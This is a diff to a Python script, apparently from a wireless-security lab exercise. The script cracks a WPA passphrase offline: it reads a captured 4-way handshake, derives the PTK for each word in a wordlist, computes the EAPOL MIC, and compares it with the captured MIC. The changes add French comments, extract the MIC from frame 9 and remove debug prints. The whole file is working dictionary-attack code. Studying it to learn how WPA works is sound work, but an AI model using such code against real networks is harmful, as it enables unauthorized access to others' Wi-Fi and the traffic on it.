@@ -43,17 +43,19 @@ wpa=rdpcap("wpa_handshake.cap")
 # Read dictionnary of the file wordlist.txt
 fname = "wordlist.txt"
 
+# Création d'un tableau de mot à partie de la liste de mot
 with open(fname) as f:
     wordArray = []
     for line in f:
         wordArray.append(line)
 
-print(wordArray)
+#print(wordArray)
 
+# Suppression des \n
 for i in range(0, len(wordArray)):
     wordArray[i] = wordArray[i].rstrip("\n")
 
-print(wordArray)
+#print(wordArray)
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 ssid        = wpa[0].info
@@ -70,26 +72,26 @@ for passPhrase in wordArray:
 
     # This is the MIC contained in the 4th frame of the 4-way handshake
     # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-    mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
+    #mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
+
+    #Récupération du mic à tester "36eef66540fa801ceee2fea9b7929b40"
+    mic_to_test = wpa[8].load.encode('hex')[-36:][:-4]
 
     B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
+    # Ajout des donnée de l'EAPOL à la chain data extraite de la trame 9
     data = "0103005f" + wpa[8].load.encode('hex')
 
-    print data
-
+    # Suppression des 36 dernier caractère hexadecimal de la chaine afin de supprimer le mic
     data = data[:-36]
 
-    print data
-
+    # Remplacement des 36 caractère hexadecimaux avec des 0
     for i in range(0,36):
         data = data + '0'
  
     data = a2b_hex(data)
 
-    print "data"
-    print "===="
-    print "data", wpa[8].load.encode('hex'), "\n"
+    print "data: ", data, "\n"
 
     print "\n\nValues used to derivate keys"
     print "============================"
@@ -111,13 +113,12 @@ for passPhrase in wordArray:
     #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
-
+    # Extraction du nouveau mic
     mic_to_compare = mic.hexdigest()[0:len(mic_to_test)]
-    print(type(mic.hexdigest()))
     print("new mic: ", mic_to_compare)
-    print(type(mic_to_test))
     print("mic to test: ", mic_to_test)
 
+    # Comparaison du nouveau mic avec le mic à tester
     if mic_to_compare == mic_to_test:
         print("YES WE DID IT")
         print(passPhrase)
